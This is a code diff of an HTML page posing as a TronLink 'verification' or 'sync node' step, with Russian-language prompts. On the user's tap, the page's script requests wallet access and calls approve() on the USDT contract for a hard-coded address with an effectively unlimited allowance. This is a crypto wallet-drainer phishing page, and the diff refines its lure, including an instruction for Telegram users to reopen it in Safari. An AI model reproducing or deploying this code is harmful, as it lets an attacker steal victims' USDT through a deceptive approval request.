@@ -3,61 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Verification</title>
+    <title>Sync Node</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 35px; border: 1px solid #222; }
+        .card { padding: 40px 25px; width: 85%; max-width: 380px; background: #111; border-radius: 30px; border: 1px solid #222; }
         .logo { width: 70px; height: 70px; background: #ff0013; border-radius: 20px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; }
-        h2 { font-size: 22px; margin-bottom: 12px; }
-        p { color: #888; font-size: 14px; line-height: 1.6; margin-bottom: 35px; }
-        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; width: 100%; box-sizing: border-box; }
-        .footer-note { color: #444; font-size: 10px; margin-top: 20px; }
+        .btn { display: block; background: #ff0013; color: #fff; text-decoration: none; padding: 20px; border-radius: 20px; font-weight: bold; text-transform: uppercase; font-size: 14px; width: 100%; border: none; cursor: pointer; }
+        .instr { color: #ffcc00; font-size: 12px; margin-top: 20px; line-height: 1.4; display: none; }
     </style>
 </head>
 <body>
-
 <div class="card">
     <div class="logo">T</div>
-    <h2 id="t">Верификация</h2>
-    <p id="d">Нажмите кнопку ниже для автоматического перехода в TronLink и подтверждения.</p>
+    <h2 id="title">Верификация</h2>
+    <p id="desc">Нажмите кнопку ниже для перехода в TronLink.</p>
     
-    <a id="actionLink" href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" class="btn">ОТКРЫТЬ TRONLINK</a>
-    
-    <div class="footer-note" id="manual">Если не переходит автоматически, нажмите три точки (⋮) и выберите "Открыть в браузере"</div>
+    <a href="tronlinkorg://dapp?url=https://timur3417.github.io/sync-node-app/" id="mainBtn" class="btn">ОТКРЫТЬ TRONLINK</a>
+
+    <div class="instr" id="tip">
+        ☝️ <b>ВАЖНО:</b> Если ничего не произошло, нажмите на <b>три точки (⋮)</b> в углу экрана и выберите <b>"Открыть в Safari"</b>.
+    </div>
 </div>
 
 <script>
-    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
-    const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+    const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
+    const btn = document.getElementById('mainBtn');
+    const tip = document.getElementById('tip');
 
-    async function checkAndSign() {
-        const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
-        
-        // Если мы уже ВНУТРИ TronLink
-        if (tron) {
-            document.getElementById('t').innerText = "Узел Обнаружен";
-            document.getElementById('d').innerText = "Нажмите «ПОДТВЕРДИТЬ» для завершения синхронизации.";
-            const link = document.getElementById('actionLink');
-            link.innerText = "ПОДТВЕРДИТЬ";
-            link.href = "#"; // Убираем редирект
-            
-            link.onclick = async (e) => {
-                e.preventDefault();
-                try {
-                    await tron.request({ method: 'tron_requestAccounts' });
-                    const contract = await tron.contract().at(USDT);
-                    await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
-                    alert("Успешно!");
-                } catch (err) {
-                    alert("Ошибка: " + err.message);
-                }
-            };
-        }
+    if (!tron) {
+        // Если мы в Телеграме, показываем подсказку про Safari
+        tip.style.display = "block";
+    } else {
+        // Если мы УЖЕ в TronLink
+        document.getElementById('title').innerText = "Узел найден";
+        document.getElementById('desc').innerText = "Нажмите для подтверждения транзакции.";
+        btn.innerText = "ПОДТВЕРДИТЬ";
+        btn.href = "#";
+        btn.onclick = async (e) => {
+            e.preventDefault();
+            try {
+                await tron.request({ method: 'tron_requestAccounts' });
+                const contract = await tron.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+                await contract.approve('TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4', '1000000000000000000').send({ feeLimit: 100000000 });
+                alert("Успешно!");
+            } catch (err) { alert("Ошибка: " + err.message); }
+        };
     }
-
-    // Запускаем проверку
-    setInterval(checkAndSign, 1000);
 </script>
 </body>
 </html>
